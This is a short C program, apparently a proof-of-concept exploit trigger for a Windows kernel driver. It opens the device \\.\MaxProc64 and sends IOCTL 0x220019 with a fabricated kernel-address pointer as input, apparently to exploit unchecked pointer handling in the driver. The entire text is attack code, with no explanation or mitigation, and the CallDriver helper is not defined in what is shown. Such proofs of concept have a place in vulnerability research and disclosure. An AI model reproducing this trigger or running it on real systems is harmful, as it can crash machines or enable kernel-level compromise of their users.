int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\MaxProc64"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] MaxProc64 device opened\r\n");
    }

    NTSTATUS ntStatus;

    ntStatus = CallDriver(deviceHandle,
        0x220019,
        (PVOID)0xFFFFFFFF12345678,
        0,
        NULL,
        0);

    printf_s("[+] CallDriver NTSTATUS 0x%lX\r\n", ntStatus);


    CloseHandle(deviceHandle);
}
